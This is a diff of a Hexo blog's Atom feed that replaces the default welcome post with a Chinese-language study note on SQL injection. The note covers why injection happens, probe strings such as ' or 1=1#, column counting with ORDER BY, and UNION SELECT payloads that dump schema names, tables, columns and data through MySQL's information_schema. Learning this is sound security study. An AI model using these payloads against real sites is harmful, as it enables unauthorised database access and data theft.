@@ -6,7 +6,7 @@
   <link href="//atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-10-28T14:39:57.566Z</updated>
+  <updated>2019-10-29T11:53:54.185Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,19 +17,19 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>Hello World</title>
-    <link href="http://yoursite.com/2019/10/28/hello-world/"/>
-    <id>http://yoursite.com/2019/10/28/hello-world/</id>
-    <published>2019-10-28T14:39:57.566Z</published>
-    <updated>2019-10-28T14:39:57.566Z</updated>
+    <title>SQL注入--学习笔记</title>
+    <link href="http://yoursite.com/2019/10/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>http://yoursite.com/2019/10/29/SQL注入-学习笔记/</id>
+    <published>2019-10-29T10:39:36.000Z</published>
+    <updated>2019-10-29T11:53:54.185Z</updated>
     
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。<br>假设我们在浏览器中输入URL <a href="http://www.abc.com?id=1" target="_blank" rel="noopener">www.abc.com?id=1</a> 时，我们在URL中传递变量id，并且提供值为1，由于它是对数据库进行动态查询的请求（其中?id＝1表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。  </p><p>造成SQL注入漏洞原因有两个 ：</p><ul><li>没有对输入的数据进行过滤（过滤输入）</li><li>没有对发送到数据的数据进行转义（转义输出）  </li></ul><h1 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h1><ul><li><code>&#39;#</code> –&gt; 报错，返回数据库错误</li><li><code>&#39; or 1=1#</code> –&gt; 永真条件，返回所有记录</li><li><code>&#39; and 1=2#</code> –&gt; 永假条件，不返回记录  </li><li><code>&#39; or &#39;1&#39;=&#39;1</code></li><li><code>&#39;and &#39;1&#39;=&#39;2</code><br>（有时候单引号不行可以试试双引号）</li></ul><h1 id="利用-information-schema"><a href="#利用-information-schema" class="headerlink" title="利用 information_schema"></a>利用 information_schema</h1><p>information_schema 是 MySQL 中的一个默认数据库，里面存放了其他所有数据库的信息。</p><h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p><code>&#39; order by 1#</code> ， <code>&#39; order by 2#</code> 如果列数不存在的话会报错，可以用二分法查询。</p><h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><ul><li><code>&#39; union select 1, group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#</code></li><li><code>&#39; union select 1, database()#</code><h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><code>&#39; union select 1, group_concat(TABLE_NAME) from information_schema.TABLES where table_schema = &#39;你想要获取的表名&#39;#</code> <h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><code>&#39; union select 1, group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_name = &#39;表名&#39;#</code><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><code>&#39; union select 1, group_concat(你想要获取的列名) from 表名#</code></li></ul>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+        &lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。&lt;br&gt;假设我们在浏览器中输入URL
       
     
     </summary>
